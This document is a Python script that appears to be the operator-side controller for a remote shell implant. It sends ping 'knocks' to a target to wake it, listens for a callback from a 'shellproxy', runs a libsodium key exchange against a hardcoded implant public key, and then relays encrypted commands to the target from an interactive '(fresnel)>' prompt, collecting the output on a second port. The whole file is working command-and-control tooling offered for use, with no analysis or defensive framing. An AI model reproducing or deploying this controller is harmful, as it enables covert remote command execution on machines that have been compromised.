"""
./remote <target> LAN ONLY
"""
import socket
import struct
import subprocess
import sys
import time
from hashlib import sha512

import pysodium

HELLO = struct.pack(">Q", 0xDEFACED)
RESP = struct.pack(">Q", 0xDEFACDE)
KIT_PUB = bytes.fromhex("e4353550c44b1c499f46f39454fb703f67265a75899a52f8d04328300dfb7e5e")
USER_PORT = 9001
OUT_PORT = 9002
MAX_PKT = 4096

def pq(x):
	return struct.pack("<Q", x)

def secret_nonce(tag, ctr):
	return bytes([tag]) + b"\0" * 7 + struct.pack("<Q", ctr) + b"\0" * 8


def box(msg, key, tag, ctr):
	return pysodium.crypto_secretbox(msg, secret_nonce(tag, ctr), key)


def handshake(hello):
	if hello[:8] != HELLO:
		raise ValueError("bad hello")
	
	n_r = hello[8:32]
	epub, epriv = pysodium.crypto_box_keypair()

	key = pysodium.crypto_box_beforenm(KIT_PUB, epriv)

	ts = pq(int(time.time()))

	n_o = pysodium.randombytes(16)
	ct = pysodium.crypto_box_afternm(ts + n_o, n_r, key)
	resp = RESP
	resp += ts 
	resp += n_r[:16]
	resp += n_o
	resp += epub 
	resp += ct 
	keys = sha512(key + epub).digest()
	return resp, keys[32:], keys[:32]


def recv_exact(sock, n):
	buf = b""
	while len(buf) < n:
		chunk = sock.recv(n - len(buf))
		if not chunk:
			raise EOFError
		buf += chunk
	return buf


def knock(target):
	print(f"sending knocks to {target}", file=sys.stderr)
	subprocess.run(
		["ping", "-c", "3", "-i", "0.2", target],
		stdout=subprocess.DEVNULL,
		stderr=subprocess.DEVNULL,
		check=False,
	)


def show(data):
	if data:
		sys.stdout.write(data.decode(errors="replace"))
		if not data.endswith(b"\n"):
			sys.stdout.write("\n")
		sys.stdout.flush()


def main(target):
	out = socket.socket()
	out.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
	out.bind(("", OUT_PORT))
	out.listen(4)

	listener = socket.socket()
	listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
	listener.bind(("", USER_PORT))
	listener.listen(1)

	knock(target)
	print("waiting for shellproxy", file=sys.stderr)
	conn, addr = listener.accept()
	listener.close()
	print(f"+ ok got {addr[0]}", file=sys.stderr)

	resp, tx_key, rx_key = handshake(recv_exact(conn, 32))
	conn.sendall(resp)
	print("+ handshake ok", file=sys.stderr)

	txctr = 1
	# iykyk where this is from
	while True:
		try:
			line = input("(fresnel)> ").strip()
		except EOFError:
			break
		if not line:
			continue
		if line == "exit":
			break

		pkt = box(line.encode(), tx_key, 0x01, txctr)
		txctr += 1
		conn.sendall(struct.pack(">H", len(pkt)) + pkt)

		out.settimeout(10)
		try:
			oconn, _ = out.accept()
		except OSError:
			continue
		oconn.settimeout(2)
		data = b""
		try:
			while True:
				chunk = oconn.recv(MAX_PKT)
				if not chunk:
					break
				data += chunk
		except OSError:
			pass
		oconn.close()
		show(data)

	conn.close()
	out.close()
	return 0


if __name__ == "__main__":
	if len(sys.argv) != 2:
		print(f"./remote <target ip>", file=sys.stderr)
		raise SystemExit(1)
	try:
		raise SystemExit(main(sys.argv[1]))
	except (EOFError, OSError, ValueError) as e:
		print(f"!!!!! {e}", file=sys.stderr)
		raise SystemExit(1)
